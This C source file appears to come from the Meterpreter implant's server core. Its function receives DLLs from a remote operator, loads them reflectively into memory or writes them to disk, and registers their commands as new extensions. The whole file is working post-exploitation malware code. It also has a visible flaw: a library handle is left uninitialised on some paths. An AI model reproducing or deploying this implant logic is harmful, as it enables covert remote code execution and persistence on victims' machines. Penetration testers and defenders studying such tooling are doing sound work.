#include "metsrv.h"

// see ReflectiveLoader.c...
extern HINSTANCE hAppInstance;

// see remote_dispatch_common.c
extern LIST * extension_list;
// see common/base.c
extern Command *extension_commands;

DWORD request_core_loadlib(Remote *remote, Packet *packet)
{
	Packet *response = packet_create_response(packet);
	DWORD res = ERROR_SUCCESS;
	HMODULE library;
	PCHAR libraryPath;
	DWORD flags = 0;
	BOOL bLibLoadedReflectivly = FALSE;

	Command *first = extension_commands;
	Command *command;

	do
	{
		libraryPath = packet_get_tlv_value_string(packet, 
				TLV_TYPE_LIBRARY_PATH);
		flags       = packet_get_tlv_value_uint(packet, 
				TLV_TYPE_FLAGS);

		// Invalid library path?
		if (!libraryPath)
		{
			res = ERROR_INVALID_PARAMETER;
			break;
		}

		// If the lib does not exist locally, but is being uploaded...
		if (!(flags & LOAD_LIBRARY_FLAG_LOCAL))
		{
			PCHAR targetPath;
			Tlv dataTlv;

			// Get the library's file contents
			if ((packet_get_tlv(packet, TLV_TYPE_DATA,
					&dataTlv) != ERROR_SUCCESS) ||
			    (!(targetPath = packet_get_tlv_value_string(packet,
					TLV_TYPE_TARGET_PATH))))
			{
				res = ERROR_INVALID_PARAMETER;
				break;
			}

			// If the library is not to be stored on disk, 
			if (!(flags & LOAD_LIBRARY_FLAG_ON_DISK))
			{
				// try to load the library via its reflective loader...
				library = LoadLibraryR( dataTlv.buffer, dataTlv.header.length );
				if( library == NULL )
				{
					// if that fails, presumably besause the library doesn't support
					// reflective injection, we default to using libloader...
					library = libloader_load_library( targetPath, 
								dataTlv.buffer, dataTlv.header.length );
				}
				else
				{
					bLibLoadedReflectivly = TRUE;
				}

				res = (library) ? ERROR_SUCCESS : ERROR_NOT_FOUND;
			}
			else
			{
				// Otherwise, save the library buffer to disk
				res = buffer_to_file(targetPath, dataTlv.buffer, 
						dataTlv.header.length);
			}

			// Override the library path
			libraryPath = targetPath;
		}

		// If a previous operation failed, break out.
		if (res != ERROR_SUCCESS)
			break;

		// Load the library
		if ((!library) && (!(library = LoadLibrary(libraryPath))))
			res = GetLastError();
		else
			res = ERROR_SUCCESS;

		// If this library is supposed to be an extension library, try to
		// call its Init routine
		if ((flags & LOAD_LIBRARY_FLAG_EXTENSION) && (library))
		{
			EXTENSION * extension = (EXTENSION *)malloc( sizeof(EXTENSION) );
			if( extension )
			{
				extension->library = library;

				// if the library was loaded via its reflective loader we must use GetProcAddressR()
				if( bLibLoadedReflectivly )
				{
					extension->init   = (LPVOID)GetProcAddressR( extension->library, "InitServerExtension" );
					extension->deinit = (LPVOID)GetProcAddressR( extension->library, "DeinitServerExtension" );
				}
				else
				{
					extension->init   = (LPVOID)GetProcAddress( extension->library, "InitServerExtension" );
					extension->deinit = (LPVOID)GetProcAddress( extension->library, "DeinitServerExtension" );
				}

				// patch in the metsrv.dll's HMODULE handle, used by the server extensions for delay loading
				// functions from the metsrv.dll library. We need to do it this way as LoadLibrary/GetProcAddress
				// wont work if we have used Reflective DLL Injection as metsrv.dll will be 'invisible' to these functions.
				remote->hMetSrv = hAppInstance;

				// Call the init routine in the library
				if( extension->init )
				{
					dprintf("[SERVER] Calling init()...");

					res = extension->init( remote );

					if( res == ERROR_SUCCESS )
						list_push( extension_list, extension );
					else
						free( extension );
				}
				dprintf("[SERVER] Called init()...");
				if (response) {
					for (command = extension_commands; command != first; command = command->next) {
						packet_add_tlv_string(response, TLV_TYPE_METHOD, command->method);
					}
				}
			}
		}

	} while (0);

	if (response)
	{
		packet_add_tlv_uint(response, TLV_TYPE_RESULT, res);
		packet_transmit(remote, response, NULL);
	}

	return res;
}
